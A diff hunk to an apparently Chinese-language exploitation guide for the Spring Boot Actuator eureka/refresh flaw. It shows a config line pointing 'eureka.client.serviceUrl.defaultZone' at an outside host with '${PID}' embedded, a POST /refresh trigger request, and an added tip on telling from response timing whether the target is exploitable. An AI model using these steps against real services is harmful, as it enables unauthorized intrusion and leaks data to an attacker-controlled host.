@@ -31,6 +31,9 @@ eureka.client.serviceUrl.defaultZone=http://${PID}@10.20.24.191:2444/
 
 ```
 然后 post refresh 任意内容,触发漏洞
+
+Ps: `一般情况需要等待3秒会有响应包，如果立即返回可能是服务缺少spring-boot-starter-actuator扩展包无法刷新漏洞则无法利用`
+
 ```
 POST /refresh HTTP/1.1
 Host: 10.20.24.191:8090
